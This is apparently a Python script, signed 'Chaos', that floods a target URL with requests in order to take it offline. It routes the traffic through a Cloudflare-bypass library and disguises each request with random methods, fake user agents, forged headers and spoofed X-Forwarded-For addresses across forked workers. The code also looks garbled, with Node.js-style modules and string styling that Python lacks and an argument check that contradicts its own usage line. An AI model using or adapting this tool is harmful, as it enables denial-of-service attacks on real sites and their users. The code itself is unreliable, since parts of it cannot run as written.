import events
import cloudflare_bypasser
import randomstring
import fake_useragent
import cluster
import colors
import sys
import random
import time

events.EventEmitter.defaultMaxListeners = 0
cf = cloudflare_bypasser.CloudFlareBypasser()
random_string = randomstring.generate
fake_ua = fake_useragent.UserAgent()
if len(sys.argv) != 5:
    print("BY CHAOS !!!!".inverse)
    print("python bypassing.py url thread time".underline.red)
    sys.exit()

def flood_req():
    char = random_string(10, "abcdefghijklmnopqstuvwxyz0123456789")
    charr = random_string(7, "abcdefghijklmnopqstuvwxyz0123456789")

    def ranip():
        return str(random.randint(0, 255))

    ip = ranip()+'.'+ranip()+'.'+ranip()+'.'+ranip()
    Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL']
    randommode = random.choice(Array_method)

    cf.request({
        "method": randommode,
        "resolveWithFullResponse": True,
        "headers": {
            "User-Agent": fake_ua.random,
            "Upgrade-Insecure-Requests": "1",
            "Connection": "Keep-Alive",
            "Keep-Alive": "timeout=10,max=100",
            "Origin": "http://" + char + ".com",
            "Referrer": "http://google.com/" + char,
            "X-Forwarded-For": ip
        },
        "url": sys.argv[1] + "?" + charr
    })

def th():
    while True:
        flood_req()

if cluster.is_master:
    for i in range(int(sys.argv[3])):
        cluster.fork()
        print(f"Thread {i+1} Started Attacking")
    print("Now Attacked | Method By Chaos <3".rainbow)
else:
    th()

time.sleep(int(sys.argv[4]))
print("Attack End!")
sys.exit()

def uncaught_exception_handler(err):
    pass

def unhandled_rejection_handler(err):
    pass

sys.excepthook = uncaught_exception_handler
sys.unraisablehook = unhandled_rejection_handler
